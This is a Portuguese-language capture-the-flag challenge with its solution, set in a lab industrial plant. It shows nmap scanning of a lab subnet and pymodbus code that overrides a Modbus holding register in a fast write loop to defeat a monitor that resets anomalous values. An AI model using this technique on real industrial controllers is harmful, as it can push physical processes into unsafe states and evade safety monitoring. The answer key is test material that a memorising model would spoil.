# Desafio 03 — Impacto: Sustentar Condição Anômala

> **Contexto:** Após os dois incidentes anteriores, a Planta "Probatio"
> adicionou um **mecanismo de monitoramento** que corrige automaticamente
> valores anômalos no registrador crítico. Sua missão é provar que é
> possível manter uma condição operacional anômala de forma **persistente**,
> contornando esse monitor.

## Objetivo

Vencer o monitoramento: mantenha o registrador crítico em valor anômalo
(**≥ 150**) de forma **sustentada por ~10 verificações consecutivas** (cerca
de 10 segundos). Uma escrita isolada **não basta**.

---

## Dicas

### 1. Descoberta de hosts

Rede do laboratório: `172.31.0.0/24`

```bash
nmap -sn 172.31.0.0/24
nmap -p 502 172.31.0.20
```

### 2. Observe o comportamento do monitor

Leia o registrador e note o valor normal (50):

```python
from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient("172.31.0.20", port=502)
client.connect()
```

Agora faça uma escrita isolada e observe o que acontece:

```python
client.write_register(address=0, value=200, device_id=1)
time.sleep(3)
print(client.read_holding_registers(address=0, count=1, device_id=1).registers)
# Volta para 50! O monitor resetou o valor.
```

### 3. A regra da sustentação

O monitor verifica o registrador **a cada 1 segundo** e o reseta para a
faixa normal sempre que encontra um valor ≥ 150. A flag só é gerada quando
o valor permanece anômalo em **10 verificações consecutivas**.

Como o monitor "ganha" de uma escrita única? Você precisa **escrever mais
rápido do que ele reseta** — um loop de escrita.

### 4. Solução: loop de escrita

```python
from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient("172.31.0.20", port=502)
client.connect()

while True:
    client.write_register(address=0, value=200, device_id=1)
    time.sleep(0.5)  # intervalo menor que o do monitor (1s)
```

Mantenha o loop rodando por **~15 segundos** e interrompa com `Ctrl+C`.
A flag será gerada enquanto o loop sustenta o valor anômalo.

### 5. Por que isso é uma dimensão de evasão?

Nos desafios anteriores, uma única ação bastava. Aqui o alvo reage às suas
ações (monitoramento defensivo) e você precisa **sustentar** a condição
atacante apesar da defesa — comportamento equivalente a manter um
comprometimento ativo sob vigilância em um ambiente real.

### 6. Validação da flag

Valide no frontend: **http://localhost:8080** (Desafio 03).
